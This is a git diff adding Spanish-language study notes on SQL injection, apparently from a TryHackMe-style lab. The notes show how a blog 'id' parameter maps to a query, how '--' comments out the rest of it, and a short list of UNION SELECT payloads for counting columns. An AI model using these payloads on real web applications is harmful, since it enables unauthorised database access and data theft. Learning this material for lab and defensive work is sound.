@@ -106,3 +106,34 @@ dele from users;
 ![image](https://github.com/user-attachments/assets/3f58136c-c584-453a-ab53-291514b0899a)
 
 
+# EJEMPLO
+
+```
+https://website.tmg/blog?id=1
+```
+
+De esta URL vemos que apunta "id=1" en la base de dato ssería
+
+```
+SELECT * from blog where id=1 and private=0 LIMIT 1;
+```
+
+```
+https://website.thm/blog?id=2;--
+```
+
+La "--" hace que acabe laconsulta haciendo que sea un comentario
+
+```
+SELECT * from blog where id=2;--
+```
+
+# IN-BAND SQLI
+
+```
+1 UNION SELECT 1
+1 UNION SELECT 1,2
+1 UNION SELECT 1,2,3
+0 UNION SELECT 1,2,3
+```
+
